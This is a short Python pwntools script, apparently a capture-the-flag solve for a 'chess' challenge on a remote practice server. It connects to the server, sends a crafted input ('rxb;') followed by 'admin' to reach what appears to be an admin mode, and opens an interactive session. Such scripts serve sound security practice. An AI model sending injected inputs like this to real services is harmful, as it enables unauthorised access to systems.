from pwn import *

def main():
	#p = process("./chess")
	p = remote("pwnable.co.il", 9002)
	p.sendline("rxb;")
	p.sendline("admin")
	p.interactive()
	
if __name__ == "__main__":
	main()
